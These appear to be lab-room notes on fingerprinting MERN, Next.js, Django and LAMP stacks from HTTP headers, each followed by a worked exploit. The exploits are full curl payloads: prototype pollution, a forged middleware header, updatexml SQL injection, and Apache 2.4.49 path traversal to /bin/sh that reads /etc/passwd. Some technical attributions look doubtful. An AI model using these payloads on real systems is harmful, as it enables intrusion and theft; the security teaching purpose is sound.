# Modern Web Stacks

Fingerprinting modern web stacks from passive HTTP signals, then exploiting a known vulnerability in each. One stack per section — more added as the room progresses.

---

**Table of contents**

- [In plain English](#in-plain-english)
- [MERN stack](#mern-stack)
- [Next.js](#nextjs)
- [Django](#django)
- [LAMP](#lamp)

---

## In plain English

The big picture before the jargon. The real skill here isn't memorising exploits — it's **recognising a stack from its signals, then knowing which kind of bug to look up.** One hook per stack:

| Stack | Spot it by | The bug, in one line |
| --- | --- | --- |
| **MERN** (Express) | `X-Powered-By: Express`, `connect.sid` cookie | Sloppy custom JavaScript merges your input into a **shared object** — change that one shared thing and *everything* copying from it becomes admin. |
| **Next.js** | `X-Powered-By: Next.js`, `window.__next_f` | The app **trusts an internal header it shouldn't** — send it yourself and the login check is skipped. |
| **Django** | `WSGIServer` server header, `csrfmiddlewaretoken` field | You get to **pick the sort column**, and it's pasted straight into SQL — so you rewrite the query and read the database. |
| **LAMP** (Apache) | `Server: Apache/2.4.49`, `403` on `/cgi-bin/` | A URL-encoding trick lets you **walk out of the web folder** — reach `/bin/sh` and run commands as the server. |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>How to use these notes:</strong> don't try to recall the exact payloads from memory — nobody does that. These notes are your <em>lookup sheet</em>. Remember the one-line hook above; come back here for the commands when you need them.
</div>

---

## MERN stack

**MERN** = MongoDB, Express.js, React, Node.js — the default for JavaScript-only teams that want one language across the whole stack. Express is minimal by design, so developers write a lot of their own utility code, and that custom code is where the bugs usually are.

**Typical Ubuntu deployment:** Node.js (NodeSource), Express on port **3000/5000**, MongoDB on **27017**, usually behind an Nginx reverse proxy in production — but often directly exposed on internal tools.

### Fingerprinting

Identify the stack *before* sending any payloads. Start with the response headers:

```bash
curl -I 10.130.132.26:3000/
```

| Signal | Value | Confidence |
| --- | --- | --- |
| `X-Powered-By` header | `Express` | High |
| `Set-Cookie` header | `connect.sid=s%3A...` | High |
| Unhandled route | `Cannot GET /nonexistent` (plain text) | High |
| Frontend root element | `<div id="root">` in HTML body | Medium |

- **`X-Powered-By: Express`** — sent on every response by default. Absent only if the dev called `app.disable('x-powered-by')`, added Helmet, or a reverse proxy (Vercel, Cloudflare, Railway) stripped it. If missing, fall back to the other signals.
- **`connect.sid` cookie** — from `express-session`. Present with `saveUninitialized: true`; with `saveUninitialized: false` it only appears after a session is created, so its absence does **not** rule out Express.
- **Unhandled route** — a default Express app returns plain text `Cannot GET /path`, distinct from Django, Apache, and Next.js error pages:

```bash
curl http://10.130.132.26:3000/nonexistent   # -> Cannot GET /nonexistent
```

### Exploiting — Prototype Pollution

After fingerprinting, enumerate the API surface. MERN apps expose JSON endpoints and often merge user input into objects with custom, unfiltered merge functions — the classic home of **prototype pollution**.

| Endpoint | Method | Purpose |
| --- | --- | --- |
| `/api/user/update` | POST | Merges submitted JSON into the session user object |
| `/api/admin/flag` | GET | Returns the flag if the user has admin access |

**The concept:** every JS object inherits from a shared `Object.prototype`. A merge function that accepts a `__proto__` key writes the property onto `Object.prototype` itself — so *every* object in the Node process then resolves `.isAdmin` as `true` via the prototype chain, even without its own property.

```bash
# 1. Confirm the admin route is gated
curl -c cookies.txt http://10.130.132.26:3000/
curl -b cookies.txt http://10.130.132.26:3000/api/admin/flag
# -> {"error":"Not authorized"}

# 2. Pollute the prototype through the unfiltered merge
curl -b cookies.txt -X POST http://10.130.132.26:3000/api/user/update \
  -H "Content-Type: application/json" -d '{"__proto__": {"isAdmin": true}}'
# -> {"status":"updated"}

# 3. Admin check now resolves true via the prototype chain
curl -b cookies.txt http://10.130.132.26:3000/api/admin/flag
# -> {"flag":"..."}
```

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Tip:</strong> If <code>__proto__</code> is filtered at the input layer, the <code>constructor.prototype</code> path — <code>{"constructor": {"prototype": {"isAdmin": true}}}</code> — reaches <code>Object.prototype</code> by a different route and can bypass that filter.
</div>

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Warning:</strong> Prototype pollution mutates global process state. Only run it against authorized targets — it can affect other users and crash the app.
</div>

---

## Next.js

**Next.js** builds on Express/Node and is the dominant React framework for production apps — investor dashboards, customer portals, marketing sites. On Ubuntu it runs as a Node process (`npm run build && npm start`). The **App Router** (default since v14) enables **React Server Components (RSC)**, which stream server-rendered output to the browser over the binary **RSC Flight protocol** — the surface behind CVE-2025-55182.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Note:</strong> Both CVEs below affect <strong>production build mode</strong> only (<code>npm run build &amp;&amp; npm start</code>). Neither manifests under <code>next dev</code> — if fingerprinting shows a dev server, they don't apply.
</div>

### Fingerprinting

```bash
curl -I http://TARGET:3001/
```

| Signal | Value | Confidence |
| --- | --- | --- |
| `X-Powered-By` header | `Next.js` | High |
| HTML source | `window.__next_f` in a `<script>` | High (confirms App Router) |
| Static asset paths | `/_next/static/chunks/` | High |
| Middleware headers | `x-middleware-next` / `x-middleware-rewrite` | Medium |
| Redirect to protected route | HTTP 307 to `/login` | Medium |

**`window.__next_f`** is the definitive App Router indicator — the hydration array for RSC data, injected into every App Router page. It never appears in Pages Router or other frameworks.

### CVE-2025-29927 — Middleware auth bypass

Middleware runs before every request and is where most Next.js apps put authentication. Next.js uses an internal header, **`x-middleware-subrequest`**, to avoid infinite loops when middleware forwards a request to itself — telling the framework "middleware already ran, skip it."

**The flaw:** Next.js never verified the header came from an *internal* process. Send it yourself and middleware — including the auth check — is skipped entirely. The value is the middleware module path repeated **five times**.

```bash
# Baseline: no cookie -> redirected to /login (middleware working)
curl -v http://TARGET:3001/dashboard          # -> 307 Location: /login

# Bypass: forge the internal subrequest header
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://TARGET:3001/dashboard
# -> DashboardFlag: ...
```

**CVSS 9.1 Critical** — full auth bypass with a single header, no credentials.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Info:</strong> With a <code>/src</code> directory layout the value becomes <code>src/middleware</code> repeated five times. Check whether <code>middleware.ts</code> sits at the project root or under <code>src/</code>.
</div>

### CVE-2025-55182 — RSC Flight RCE (reference)

Unauthenticated **RCE via insecure deserialisation** in the RSC Flight protocol parser. Affects Next.js 14 (≥ 14.3.0-canary.77) and 15.x (< 15.2.3) paired with React 19. **CVSS 10.0 Critical.** Covered in depth (probe → command execution, detection, remediation) in the dedicated *CVE-2025-55182: React2Shell* room — out of scope for this fingerprinting-focused task.

---

## Django

**Django** is the Python-native framework favoured by government, newsrooms, and Python-shop SaaS. Its ORM normally shields against SQL injection — but when a developer concatenates user input into raw SQL, or hits a flawed deprecated ORM path, the database is exposed.

**CVE-2021-35042** — SQL injection in Django's `order_by()` query method. **CVSS 9.8 Critical**, no authentication required.

**Typical Ubuntu deployment:** Gunicorn or the built-in dev server on port **8000**; admin panel at `/admin/` and CSRF middleware enabled by default.

### Fingerprinting

```bash
curl -I "http://10.82.95.115:8000/products/"
```

| Signal | Value | Confidence |
| --- | --- | --- |
| `Server` header | `WSGIServer/0.2 CPython/X.X.X` | High |
| Cookie name | `csrftoken` | High |
| `csrfmiddlewaretoken` hidden field | in any POST form's HTML | High |
| `X-Frame-Options` | `DENY` | High |
| `X-Content-Type-Options` | `nosniff` | High |
| `Referrer-Policy` | `same-origin` | Medium |

- **`csrfmiddlewaretoken`** is the most reliable signal — Django's `CsrfViewMiddleware` injects it into every POST form. Absent from Express, Rails, and Next.js.
- The trio **`X-Frame-Options: DENY` + `X-Content-Type-Options: nosniff` + `Referrer-Policy: same-origin`** together signals Django's `SecurityMiddleware` — no other framework applies all three by default.

### CVE-2021-35042 — SQL injection via `order_by()`

The product catalogue at `/products/` exposes a user-controlled `order` parameter that lands **unvalidated** inside an `ORDER BY` clause:

```python
order = self.request.GET.get('order', 'name')
sql = ('SELECT id, name, price, description FROM products_product '
       f'ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)')
```

`1=1` is always true, so the `THEN {order}` branch always runs — that's the injection point.

**`updatexml()` error-based extraction:** `updatexml(1, xpath_expr, 1)` throws when the XPath is invalid. Wrapping a `SELECT` in `concat(0x7e, ...)` (where `0x7e` = `~`, a marker) forces MySQL to leak the query result inside the error message, surfaced in the HTTP 500 body.

```bash
# 1. Confirm injection + read MySQL version (~ prefix = payload executed)
curl -s "http://TARGET:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" \
  | grep -o '~[0-9][^&]*'
# -> ~8.0.45-0ubuntu0.22.04.1   (500 page also shows Django Version: 3.2.4)

# 2. Extract the current database name
curl -s "http://TARGET:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" \
  | grep -o '~[0-9a-zA-Z_][^&]*'
# -> ~vuln_db
```

From here, feed the injection point to **sqlmap** to enumerate and dump the full database.

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Warning:</strong> The <code>updatexml()</code> error technique only works when <code>DEBUG = True</code> in <code>settings.py</code> — a production app (<code>DEBUG = False</code>) returns a generic 500 with no details. Verify first; if debug output is suppressed, fall back to blind time-based injection with <code>SLEEP()</code>.
</div>

---

## LAMP

**LAMP** = Linux, Apache, MySQL, PHP — one of the oldest web stacks, and still common in legacy systems and enterprise apps because every component is open-source, stable, and simple to deploy. Linux is the OS, **Apache** handles requests, **MySQL** holds the data, **PHP** runs the server-side logic.

**Typical Ubuntu deployment:** Apache runs as `www-data`, serves files from `/var/www/html`, and hands dynamic requests to PHP via `mod_php` or PHP-FPM. Common attack surfaces: exposed PHP files, verbose database errors, weak file permissions, misconfigured Apache/PHP settings.

### Fingerprinting

```bash
curl -I http://TARGET:8080/
```

| Signal | Value | Confidence |
| --- | --- | --- |
| `Server` header | `Apache/2.4.49 (Unix)` | High — exact CVE match |
| 404 page footer | repeats the `Apache/2.4.49` version string | High |
| `/cgi-bin/` response | `403 Forbidden` (not `404`) | High — confirms `mod_cgi` enabled |

- **`Server: Apache/2.4.49 (Unix)`** on its own is enough to point at **CVE-2021-41773** — this header maps to that exact version.
- A **404** on a made-up path repeats the same version string in the error page footer, useful when the `Server` header has been stripped:

```bash
curl -v http://TARGET:8080/nonexistent
# -> 404 Not Found, footer/headers still show Apache/2.4.49 (Unix)
```

- **`/cgi-bin/` → 403, not 404** tells you the directory exists and directory listing is off — i.e. `mod_cgi` is configured. This exploit needs `mod_cgi`, so this check is required, not optional:

```bash
curl -v http://TARGET:8080/cgi-bin/
# -> 403 Forbidden (exists, mod_cgi likely on)
```

### CVE-2021-41773 — Path Traversal → RCE

Apache 2.4.49 changed `ap_normalize_path()`, and the change broke the path-traversal filter's *ordering*: the filter checks for `../` **before** the URL is fully decoded.

Send `.%2e/` — a literal dot, then a URL-encoded dot (`%2e`), then a slash. The filter doesn't recognise this as `../` and lets it through. But when Apache later hands the path to the filesystem, the OS decodes `%2e` back to `.` and resolves `.%2e/` as `../` — the traversal filter has been bypassed.

That alone gives directory traversal for **reading files**. It becomes **RCE** because `/cgi-bin/` has CGI execution enabled: if the traversal resolves onto an executable like `/bin/sh`, Apache runs it as a CGI script and pipes the HTTP **POST body** to its stdin.

```bash
# curl normalises .%2e/ away by default — this flag stops that
curl -v --path-as-is "http://TARGET:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data 'id'
```

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Warning:</strong> <code>curl</code> normalises URLs before sending — without <code>--path-as-is</code> it silently cleans up the <code>.%2e/</code> sequences, the server never sees the encoded dots, and traversal requests come back <code>403</code> instead of executing.
</div>

**Step 1 — confirm RCE.** Four `.%2e/` segments climb from `/cgi-bin/` up to `/bin/sh`. The `echo Content-Type: text/plain; echo;` preamble is required by the CGI spec — Apache needs a valid HTTP header block before the body or it returns `500`; the bare `echo` supplies the blank separator line:

```bash
curl -s --path-as-is "http://10.129.175.13:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; id'
# -> uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

RCE confirmed, running as `daemon` — the same low-privilege user Apache runs as.

**Step 2 — read system accounts:**

```bash
curl -s --path-as-is "http://10.129.175.13:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
```

**Step 3 — read the flag:**

```bash
curl -s --path-as-is "http://10.129.175.13:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; cat /flag.txt'
```

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Info:</strong> CVE-2021-41773 is version-specific — <strong>Apache 2.4.49 only</strong>. The 2.4.50 patch blocked single-encoded dots but not double-encoding (tracked separately as <strong>CVE-2021-42013</strong>, using <code>%%32%65%%32%65/</code>). 2.4.51+ is fully patched. A <code>Server</code> header showing <code>Apache/2.4.49</code> or <code>Apache/2.4.50</code> is an immediate signal to try this chain.
</div>
